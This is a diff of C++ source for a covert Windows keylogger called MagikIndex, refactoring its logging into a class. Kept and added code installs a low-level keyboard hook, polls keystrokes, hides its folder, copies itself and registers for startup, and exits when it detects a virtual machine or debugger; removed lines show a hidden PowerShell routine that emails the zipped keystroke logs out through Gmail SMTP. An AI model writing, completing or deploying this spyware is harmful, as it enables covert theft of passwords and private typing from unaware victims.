@@ -1,102 +1,46 @@
-#define WIN32_LEAN_AND_MEAN
+#include "common.h"
 
-#define _CRT_SECURE_NO_WARNINGS
-#include <atlbase.h>
-#include <atlconv.h>
-#include <windows.h>
-#include <vector>
-#include <wininet.h>
-#include <iostream>
-#include <string>
-#include <fstream>
-#include <VersionHelpers.h>
-#include <slpublic.h>
-#include <tlhelp32.h>
-#include <algorithm>
-#include <iterator>
-#include <memory>
-#include <set>
-#include <vector>
-#include <comdef.h>
-#include <comutil.h>
-#include <Shldisp.h>
-#include <shellapi.h>
-#include <time.h>
-#include <taskschd.h>
-#include <assert.h>
-#include <intrin.h>
-#include <array>
 //#include "lz4/lz4.h"
 //#include <Wbemidl.h>
 //#include <wbemcli.h>
 
+
 #pragma warning( push )
 #pragma warning( disable : 4477 )
 
-typedef std::string String;
-typedef std::vector<String> StringVector;
-typedef unsigned long long uint64_t;
 
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
+    Log log;
+    BOOL fEatKeystroke = FALSE;
 
-using buffer = std::vector<char>;
-
-//------------------------------------------------------
-// Customization
-
-#define CharactersPerLog 300
-#define MaximumFolderSize 10 
-#define RequiredRam 2048 //MB
-#define RequiredCores 2 
-#define CryptPassword "MyPassword" 
-#define BaseShiftValue 100 //base int to add to chars for crypting measures
-#define SecondsBetweenScreenshots 20000
-#define SendersEmail ""
-#define SendersPsw ""
-#define RecieversEmail ""
-
-//------------------------------------------------------
-
-#define MAX_LENGTH 1024
-
-
-#define WINDOWS_SLID                                                \
-            { 0x55c92734,                                           \
-              0xd682,                                               \
-              0x4d71,                                               \
-            { 0x98, 0x3e, 0xd6, 0xec, 0x3f, 0x16, 0x05, 0x9f   }    \
+    if (nCode == HC_ACTION)
+    {
+        if (wParam == WM_KEYDOWN){
+            //case WM_SYSKEYDOWN:
+            PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
+            log.LogItInt(p->vkCode);
+        }
+    }
+    return(fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
 }
 
+void InstallHook() {
 
-#pragma comment(lib, "Wininet.lib")
-#pragma comment(lib, "Slwga.lib")
-#pragma comment( lib, "comsuppw.lib" )
-//#pragma comment(lib, "Wbemuuid.lib.")
+    HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
 
-//#define debug
+    // Keep this app running until we're told to stop
+    MSG msg;
+    while (!GetMessage(&msg, NULL, NULL, NULL)) {    //this while loop keeps the hook
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
 
-FILE* OUTPUT_FILE;
-
-extern "C" int RandomGenerator();
-int SilentlyRemoveDirectory(const char* dir);
-PBITMAPINFO CreateBitmapInfoStruct(HBITMAP hBmp);
-void CreateBMPFile(LPCSTR pszFile, HBITMAP hBMP);
-BOOL WINAPI SaveBitmap(std::string wPath);
-std::set<DWORD> getAllThreadIds();
-template <class InputIterator> HRESULT CopyItems(__in InputIterator first, __in InputIterator last, __in PCSTR dest);
-ULONG WINAPI ScreenGrabber(LPVOID Parameter);
-int ExtrapolateKey();
-int CalculateDirSize(std::string DirectoryToCheck);
-BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args); 
-std::string EncryptMyString(std::string UnencryptedString);
-void LogItInt(int key_stroke, std::string FileName);
-void LogItChar(std::string Value, std::string FileName);
-void SendLog(std::string CurrentLog);
-ULONG WINAPI Protect(LPVOID);
-std::string GetCpuInfo();
-//void Compress(const buffer& in, buffer& out);
+}
 
 int main()
 {
+
 
     FreeConsole();
 
@@ -149,6 +93,10 @@ int main()
 
 Log:
 
+    Log log;
+    log.ExtrapolateKey();
+    log.CreateLog();
+
     DWORD Tick = GetTickCount();
 
     std::string TimeText = "Current Tick:";
@@ -186,17 +134,6 @@ Log:
 
     std::string LogTime = std::to_string(Tick);
 
-    std::string CurrentLog = AppData;
-    CurrentLog += "\\MagikIndex";
-
-    CreateDirectoryA(CurrentLog.c_str(),NULL);
-
-    SetFileAttributesA(CurrentLog.c_str(), FILE_ATTRIBUTE_HIDDEN);
-
-    CurrentLog += "\\Log";
-    CurrentLog += LogTime;
-    CurrentLog += ".txt";
-
     SYSTEMTIME SysTime;
     char TimeBuffer[512];
     ZeroMemory(&TimeBuffer, sizeof(TimeBuffer));
@@ -216,24 +153,24 @@ Log:
     StartDate += std::to_string(SysTime.wSecond);
     StartDate += "_________\n";
 
-    LogItChar(StartDate, CurrentLog);
+    log.LogItChar(StartDate);
 
 #ifdef debug
 
-    LogItChar("#\n#/!\\STARTED IN DEBUG MODE/!\\\n#", CurrentLog);
-    LogItChar("Not crypting the logs...", CurrentLog);
+    log.LogItChar("#\n#/!\\STARTED IN DEBUG MODE/!\\\n#");
+    log.LogItChar("Not crypting the logs...");
 
 #else
 
-    LogItChar("Started in normal mode...", CurrentLog);
-    CryptText += std::to_string(ExtrapolateKey());
+    log.LogItChar("Started in normal mode...");
+    CryptText += std::to_string(/*ExtrapolateKey()*/1000);
     CryptText += "\" Key Shift...";
-    LogItChar(CryptText, CurrentLog);
+    log.LogItChar(CryptText);
 
 #endif
 
     if (PatchedMe) {
-        LogItChar("I was patched! Exiting... ;(",CurrentLog);
+        log.LogItChar("I was patched! Exiting... ;(");
         exit(1);
     }
 
@@ -263,7 +200,7 @@ Log:
 
     if (FirstLog) {
 
-        LogItChar("First log of the session, copying files and adding to startup...", CurrentLog);
+        log.LogItChar("First log of the session, copying files and adding to startup...");
 
         std::string DestinationFile = "C:\\Users\\";
         DestinationFile += UserName;
@@ -279,7 +216,7 @@ Log:
             Command += DestinationFile;
             Command += "\\*.*";
             ShellExecuteA(0, "open", "cmd.exe", Command.c_str(), 0, SW_HIDE);
-            LogItChar("Cleaned MagikIndex folder...", CurrentLog);
+            log.LogItChar("Cleaned MagikIndex folder...");
             Sleep(200);
         }
         DestinationFile += "\\";
@@ -299,14 +236,14 @@ Log:
 
         CopiedFileText += CopiedFile;
         CopiedFileText += ".exe\"...";
-        LogItChar(CopiedFileText, CurrentLog);
+        log.LogItChar(CopiedFileText);
 
         RegisterMyProgramForStartup("MagikIndex", DestinationFile.c_str(), "");
 
-        LogItChar("Registered executable for startup...", CurrentLog);
+        log.LogItChar("Registered executable for startup...");
 
     }else{
-        LogItChar("Not the first log of the session, skip copying files...", CurrentLog);
+        log.LogItChar("Not the first log of the session, skip copying files...");
     }
 
     int x1, y1, x2, y2, w, h, mo, mb;
@@ -331,7 +268,7 @@ Log:
     }
 #ifndef debug
     if (!RatioMatch) {
-        LogItChar("Aspect ratio doesn't match the list: probably a VM... exiting....",CurrentLog);
+        log.LogItChar("Aspect ratio doesn't match the list: probably a VM... exiting....");
         exit(1);
     }
 #endif
@@ -402,7 +339,7 @@ Log:
 
 #ifndef debug
     if (siSysInfo.dwNumberOfProcessors < RequiredCores || (RAMStatus.ullTotalPhys / 1024) / 1024 < RequiredRam) {
-        LogItChar("PC Specs dont match the requirements: probably a VM... exiting....", CurrentLog);
+        log.LogItChar("PC Specs dont match the requirements: probably a VM... exiting....");
         exit(1);
     }
 #endif
@@ -436,76 +373,75 @@ Log:
         LOCALE_NAME_MAX_LENGTH+1);
 
     TimeText += LogTime;
-    LogItChar(TimeText, CurrentLog);
+    log.LogItChar(TimeText);
 
     ComputerText += HostName;
-    LogItChar(ComputerText, CurrentLog);
+    log.LogItChar(ComputerText);
 
     UsernameText += UserName;
-    LogItChar(UsernameText, CurrentLog);
+    log.LogItChar(UsernameText);
 
     InternetText += InternetStatusString;
-    LogItChar(InternetText, CurrentLog);
+    log.LogItChar(InternetText);
 
     WidthText += Width;
-    LogItChar(WidthText, CurrentLog);
+    log.LogItChar(WidthText);
 
     HeightText += Height;
-    LogItChar(HeightText, CurrentLog);
+    log.LogItChar(HeightText);
 
     AspectRatioText += std::to_string(Ratioed);
-    LogItChar(AspectRatioText,CurrentLog);
+    log.LogItChar(AspectRatioText);
 
     WindowsText += WindowsVersion;
-    LogItChar(WindowsText, CurrentLog);
+    log.LogItChar(WindowsText);
 
     OEMText += OEMNumber;
-    LogItChar(OEMText,CurrentLog);
+    log.LogItChar(OEMText);
 
     RAMText += RAMAmount;
     RAMText += " MB";
-    LogItChar(RAMText,CurrentLog);
+    log.LogItChar(RAMText);
 
     CPUNumberText += CPUCores;
-    LogItChar(CPUNumberText, CurrentLog);
+    log.LogItChar(CPUNumberText);
 
     CPUTypeText += CPUType;
-    LogItChar(CPUTypeText, CurrentLog);
+    log.LogItChar(CPUTypeText);
 
     CPUBrand += GetCpuInfo();
-    LogItChar(CPUBrand, CurrentLog);
+    log.LogItChar(CPUBrand);
 
     GenuineText += IsGenuine;
-    LogItChar(GenuineText, CurrentLog);
+    log.LogItChar(GenuineText);
 
     MouseText += MouseButtons;
-    LogItChar(MouseText, CurrentLog);
+    log.LogItChar(MouseText);
 
     MonitorText += Monitors;
-    LogItChar(MonitorText, CurrentLog);
+    log.LogItChar(MonitorText);
 
     BootText += BootMode;
-    LogItChar(BootText, CurrentLog);
+    log.LogItChar(BootText);
 
     SlowText += SlowMachine;
-    LogItChar(SlowText, CurrentLog);
+    log.LogItChar(SlowText);
 
     LanguageText += GetSystemDefaultUILanguage();
-    LogItChar(LanguageText, CurrentLog);
+    log.LogItChar(LanguageText);
 
     CurrencyText += Locale;
-    LogItChar(CurrencyText, CurrentLog);
+    log.LogItChar(CurrencyText);
 
     MiddleEastText += MiddleEast;
-    LogItChar(MiddleEastText, CurrentLog);
+    log.LogItChar(MiddleEastText);
 
     SeedText += std::to_string(RandSeed);
-    LogItChar(SeedText, CurrentLog);
+    log.LogItChar(SeedText);
 
 
-    LogItChar("_____________________________________________\n",CurrentLog);
+    log.LogItChar("_____________________________________________\n");
 
-    SetFileAttributesA(CurrentLog.c_str(), FILE_ATTRIBUTE_HIDDEN);
 
 
 
@@ -519,7 +455,7 @@ Log:
          Sleep(25);
          for (int i = 8; i < 190; i++) {
              if (GetAsyncKeyState(i) == -32767) {
-                 LogItInt(i, CurrentLog);
+                 log.LogItInt(i);
                  k++;
              }
          }
@@ -531,10 +467,10 @@ Log:
      FileSubmit(CurrentLog.c_str(),RemoteFile.c_str());
      */
 
-     LogItChar("\n_____________________________________________", CurrentLog);
-     LogItChar("Character limit hit, sending log...",CurrentLog);
+     log.LogItChar("\n_____________________________________________");
+     log.LogItChar("Character limit hit, sending log...");
 
-     SendLog(CurrentLog);
+     log.SendLog();
      FirstLog = false;
 
      goto Log;
@@ -717,85 +653,9 @@ BOOL WINAPI SaveBitmap(std::string wPath)
 
 
 
-std::set<DWORD> getAllThreadIds()
-{
-    auto processId = GetCurrentProcessId();
-    auto currThreadId = GetCurrentThreadId();
-    std::set<DWORD> thread_ids;
-    std::unique_ptr< void, decltype(&CloseHandle) > h(CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0), CloseHandle);
-    if (h.get() != INVALID_HANDLE_VALUE)
-    {
-        THREADENTRY32 te;
-        te.dwSize = sizeof(te);
-        if (Thread32First(h.get(), &te))
-        {
-            do
-            {
-                if (te.dwSize >= (FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) + sizeof(te.th32OwnerProcessID)))
-                {
-                    //only enumerate threads that are called by this process and not the main thread
-                    if ((te.th32OwnerProcessID == processId) && (te.th32ThreadID != currThreadId))
-                    {
-                        thread_ids.insert(te.th32ThreadID);
-                    }
-                }
-                te.dwSize = sizeof(te);
-            } while (Thread32Next(h.get(), &te));
-        }
-    }
-    return thread_ids;
-}
-
-template <class InputIterator>
-HRESULT CopyItems(__in InputIterator first, __in InputIterator last, __in PCSTR dest)
-{
-    _COM_SMARTPTR_TYPEDEF(IShellDispatch, IID_IShellDispatch);
-    _COM_SMARTPTR_TYPEDEF(Folder, IID_Folder);
-    IShellDispatchPtr shell;
-    FolderPtr destFolder;
-
-    variant_t dirName, fileName, options;
-
-    HRESULT hr = CoCreateInstance(CLSID_Shell, NULL, CLSCTX_INPROC_SERVER, IID_IShellDispatch, (void**)&shell);
-    if (SUCCEEDED(hr))
-    {
-        dirName = dest;
-        hr = shell->NameSpace(dirName, &destFolder);
-        if (SUCCEEDED(hr))
-        {
-            auto existingThreadIds = getAllThreadIds();
-            options = FOF_SILENT | FOF_NOCONFIRMATION | FOF_NOERRORUI;  //NOTE:  same result as 0x0000
-            while (first != last)
-            {
-                fileName = *first;
-                printf("Copying %s to %s ...\n", *first, dest);
-                ++first;
-                hr = destFolder->CopyHere(fileName, options); //NOTE: this appears to always return S_OK even on error
-
-                auto updatedThreadIds = getAllThreadIds();
-                std::vector<decltype(updatedThreadIds)::value_type> newThreadIds;
-                std::set_difference(updatedThreadIds.begin(), updatedThreadIds.end(), existingThreadIds.begin(), existingThreadIds.end(), std::back_inserter(newThreadIds));
-
-                std::vector<HANDLE> threads;
-                for (auto threadId : newThreadIds)
-                    threads.push_back(OpenThread(SYNCHRONIZE, FALSE, threadId));
-
-                if (!threads.empty())
-                {
-                    // Waiting for new threads to finish not more than 5 min.
-                    WaitForMultipleObjects((DWORD)threads.size(), &threads[0], TRUE, 5 * 60 * 1000);
-
-                    for (size_t i = 0; i < threads.size(); i++)
-                        CloseHandle(threads[i]);
-                }
-            }
-        }
-    }
-    return hr;
-}
 
 
-ULONG WINAPI ScreenGrabber(LPVOID Parameter) {   //remove old emailer
+/*ULONG WINAPI ScreenGrabber(LPVOID Parameter) {   //remove old emailer
 
     char* AppData = nullptr;
     DWORD Size = MAX_LENGTH + 1;
@@ -854,19 +714,7 @@ ULONG WINAPI ScreenGrabber(LPVOID Parameter) {   //remove old emailer
         SilentlyRemoveDirectory(ScreenshotDir.c_str());
 
     }
-}
-
-
-int ExtrapolateKey() {
-
-    std::string Passwd = CryptPassword;
-    int ExtrapolatedKey = BaseShiftValue;
-    for (int plq = 0; plq < Passwd.size(); plq++) {
-        ExtrapolatedKey += (int)Passwd[plq];
-    }
-    return ExtrapolatedKey;
-}
-
+}*/
 
 int CalculateDirSize(std::string DirectoryToCheck) {
 
@@ -933,168 +781,6 @@ BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args)
     }
 
     return fSuccess;
-}
-
-std::string EncryptMyString(std::string UnencryptedString) {
-#ifndef debug
-    std::string CryptedString;
-    for (int r = 0; r < UnencryptedString.size(); r++) {
-        CryptedString += UnencryptedString[r] + ExtrapolateKey();
-    }
-    UnencryptedString = CryptedString;
-#endif
-    return UnencryptedString;
-}
-
-void LogItInt(int key_stroke, std::string FileName) {
-    if (key_stroke == 1 || key_stroke == 2)
-        return;
-    if (key_stroke == VK_MBUTTON || key_stroke == VK_XBUTTON1 || key_stroke == VK_XBUTTON2 || key_stroke == 7)
-        return;
-
-    fopen_s(&OUTPUT_FILE, FileName.c_str(), "a+");
-
-    std::cout << key_stroke << std::endl;
-
-    if (key_stroke == 8)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[BACKSPACE]"));
-    else if (key_stroke == 13)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("\n"));
-    else if (key_stroke == VK_SPACE)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString(" "));
-    else if (key_stroke == VK_LWIN)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[WIN]"));
-    else if (key_stroke == VK_TAB)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[TAB]"));
-    else if (key_stroke == VK_CAPITAL)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[CAPS LOCK]"));
-    else if (key_stroke == VK_SHIFT)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[SHIFT]"));
-    else if (key_stroke == VK_CONTROL)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[CONTROL]")); //later check for clipboard
-    else if (key_stroke == VK_ESCAPE)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[ESCAPE]"));
-    else if (key_stroke == VK_END)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[END]"));
-    else if (key_stroke == VK_HOME)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[HOME]"));
-    else if (key_stroke == VK_DELETE)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[DELETE]"));
-    else if (key_stroke == VK_LEFT)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[LEFT]"));
-    else if (key_stroke == VK_UP)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[UP]"));
-    else if (key_stroke == VK_RIGHT)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[RIGHT]"));
-    else if (key_stroke == VK_DOWN)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[DOWN]"));
-    else if (key_stroke == 190 || key_stroke == 110)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("."));
-    else
-#ifndef debug
-        key_stroke += ExtrapolateKey();
-#endif
-    fprintf(OUTPUT_FILE, "%s", &key_stroke);
-    fclose(OUTPUT_FILE);
-}
-
-void LogItChar(std::string Value, std::string FileName) {
-#ifndef debug
-    if (IsDebuggerPresent()) {
-        exit(0);
-    }
-
-#endif
-
-    Value += "\n";
-
-    std::ofstream File;
-    File.open(FileName, std::ios_base::app);
-    File << EncryptMyString(Value);
-    File.close();
-}
-/*
-void Compress(const buffer& in, buffer& out)
-{
-    auto rv = LZ4_compress_default(in.data(), out.data(), in.size(), out.size());
-    if (rv < 1) std::cerr << "Something went wrong!" << std::endl;
-    else out.resize(rv);
-}
-
-void CompressFile(std::string Path) {
-    DWORD WrittenBytes;
-    char FileBufferer[1000 + CharactersPerLog];
-    buffer FileBuffer[1000 + CharactersPerLog];
-    
-
-    std::ifstream InputFile(Path, std::ios::binary);
-    while (!InputFile.eof()) {
-        InputFile.read(FileBufferer,sizeof(FileBufferer));
-        strcat(FileBuffer, FileBufferer);
-    }
-    InputFile.close();
-    DeleteFileA(Path.c_str());
-    buffer data(1000, FileBuffer);
-    buffer compressed(FileBuffer.size()), decompressed(data.size());
-    Compress(FileBuffer, Compressed);
-    HANDLE LZ4File = CreateFileA(Path.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    WriteFile(LZ4File, Compressed, strlen(Compressed), &WrittenBytes, NULL);
-    CloseHandle(LZ4File);
-}
-*/
-void SendLog(std::string CurrentLog) {
-    std::string ZipPath = CurrentLog;
-    ZipPath += ".zip";
-    FILE* f = fopen(ZipPath.c_str(), "wb");
-    fwrite("\x50\x4B\x05\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 22, 1, f);
-    fclose(f);
-    const char* files[] = {
-        CurrentLog.c_str()
-    };
-    {
-        CoInitialize(NULL);
-        CopyItems(std::cbegin(files), std::cend(files), ZipPath.c_str());
-        CoUninitialize();
-    }
-    std::string Command = "/C powershell ";
-    char SysDir[MAX_PATH];
-    GetSystemDirectoryA(SysDir, MAX_PATH);
-    DWORD WrittenBytes, DWFlags;
-    char* AppData = nullptr;
-    size_t AppDataSize;
-    strcat_s(SysDir, MAX_PATH,"\\cmd.exe");
-    _dupenv_s(&AppData, &AppDataSize, "APPDATA");
-    std::string Powershell = AppData;
-    Powershell += "\\MagikIndex\\PSScript";
-    Powershell += std::to_string(GetTickCount());
-    Powershell += ".PS1";
-    std::string PSStartup = "MagikMailer";
-    PSStartup += std::to_string(GetTickCount());
-    HANDLE PS1File = CreateFileA(Powershell.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    std::string a = "$online = test-connection 8.8.8.8 -Count 1 -Quiet\nif ($online)\n{\n$SMTPServer = 'smtp.gmail.com'\n$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)\n$SMTPInfo.EnableSsl = $true\n$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('";
-    a += SendersEmail;
-    a += "', '";
-    a += SendersPsw;
-    a += "')\n$ReportEmail = New-Object System.Net.Mail.MailMessage\n$ReportEmail.From = '";
-    a += SendersEmail;
-    a += "'\n$ReportEmail.To.Add('";
-    a += RecieversEmail;
-    a += "')\n$ReportEmail.Subject = 'MagikIndex'\n$ReportEmail.Body = 'Your Magik Logger'\n$ReportEmail.Attachments.Add('";
-    a += ZipPath.c_str();
-    a += "')\n$SMTPInfo.Send($ReportEmail)\nRemove-Item $MyINvocation.InvocationName\nexit\n}\nelse\n{\nexit\n}";
-    WriteFile(PS1File, a.c_str(), (DWORD)strlen(a.c_str()), &WrittenBytes, NULL);
-    CloseHandle(PS1File);
-    Command = "/C PowerShell.exe -ExecutionPolicy Unrestricted -command \"";
-    Command += Powershell;
-    Command += "\"";
-    if (!InternetGetConnectedState(&DWFlags, NULL)) {
-        //LogItChar("No Internet, scheduling task for log extraction...", CurrentLog);
-        RegisterMyProgramForStartup(PSStartup.c_str(), SysDir, Command.c_str());
-    }else{
-        //LogItChar("Connected to the internet, sending the log...", CurrentLog);
-        //system(Command.c_str());
-        ShellExecuteA(NULL, "open", SysDir, Command.c_str(), NULL, SW_HIDE);
-    }
 }
 
 ULONG WINAPI Protect(LPVOID Parameter) {
